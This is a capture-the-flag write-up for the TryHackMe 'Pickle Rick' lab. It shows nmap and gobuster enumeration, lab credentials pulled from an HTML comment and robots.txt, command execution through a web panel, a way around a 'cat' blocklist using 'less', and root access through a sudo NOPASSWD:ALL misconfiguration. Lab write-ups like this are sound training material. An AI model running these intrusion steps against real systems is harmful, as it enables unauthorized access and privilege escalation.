# Pickle Rick — TryHackMe — Easy

> **Date:** 2026-05-27\
> **Platform:** TryHackMe\
> **Difficulty:** Easy\
> **Tags:** `#linux` `#rce` `#web` `#privesc` `#credentials`

---

## Summary

Linux machine running an Apache web server. Initial access obtained via credentials found in the HTML source code and robots.txt. Exploitation achieved through a web-based command panel (RCE) as www-data. Privilege escalation via sudo misconfiguration (NOPASSWD:ALL).

---

## Reconnaissance

### Nmap scan

```bash
nmap -sC -sV -oN pickle_rick.txt 10.114.187.58
```

**Open ports:**

|Port|Service|Version|
|---|---|---|
|22|SSH|OpenSSH 8.2p1 Ubuntu|
|80|HTTP|Apache httpd 2.4.41|

---

## Enumeration

### Directory bruteforce

```bash
gobuster dir -u http://10.114.187.58 \
  -w /usr/share/wordlists/dirb/common.txt \
  -x php,txt,html
```

**Interesting findings:**

|Path|Status|Note|
|---|---|---|
|/login.php|200|Login page|
|/robots.txt|200|Contains sensitive info|
|/portal.php|302|Redirects to login|

### Information Disclosure

**robots.txt:**

```bash
curl http://10.114.187.58/robots.txt
# → Wubbalubbadubdub
```

**HTML source code:**

```bash
curl http://10.114.187.58/index.html
# → <!-- Username: R1ckRul3s -->
```

**Credentials found:**

|Field|Value|Source|
|---|---|---|
|Username|`R1ckRul3s`|HTML comment|
|Password|`Wubbalubbadubdub`|robots.txt|

---

## Exploitation

### Web Command Panel — RCE

Logged in at `/login.php` with credentials above. Portal exposes a command execution panel → **authenticated RCE as www-data**.

```bash
whoami       # www-data
ls -la       # webroot contents
```

**Files found:**

- `Sup3rS3cretPickl3Ingred.txt`
- `clue.txt`

> ⚠️ `cat` was disabled — bypassed using `less`

```bash
less Sup3rS3cretPickl3Ingred.txt
less clue.txt
# → "Look around the file system for the other ingredient"
```

---

## Flags

### Ingredient #1

```bash
less Sup3rS3cretPickl3Ingred.txt
```

→ `THM{REDACTED}`

### Ingredient #2

```bash
ls /home
ls /home/rick
less /home/rick/"second ingredient"
```

→ `THM{REDACTED}`

### Ingredient #3 — Privilege Escalation

```bash
sudo -l
```

**Output:**

```
User www-data may run the following commands:
    (ALL) NOPASSWD: ALL
```

```bash
sudo ls /root
sudo less /root/3rd.txt
```

→ `THM{REDACTED}`

---

## Lessons Learned

- `robots.txt` and HTML source code are often overlooked, but they can expose sensitive information like credentials — always check them before anything else.
- The command filter blocked `cat` but allowed `less` to read the same files. Blocking individual command names did not prevent file access on this machine.
- `sudo -l` should be the first command after getting a shell — `NOPASSWD: ALL` is a critical misconfiguration that instantly gives root access and is surprisingly common on poorly configured systems.

---

## Attack Chain Summary

```
robots.txt → password: Wubbalubbadubdub
HTML source → username: R1ckRul3s
→ login.php → Command Panel RCE (www-data)
→ cat disabled → bypass: less
→ sudo -l → NOPASSWD: ALL
→ sudo less /root/[file] → Ingredient #3
```

---

## References

- [TryHackMe - Pickle Rick](https://tryhackme.com/room/picklerick)
- [HackTricks - Sudo Privilege Escalation](https://book.hacktricks.xyz/linux-hardening/privilege-escalation#sudo-and-suid)
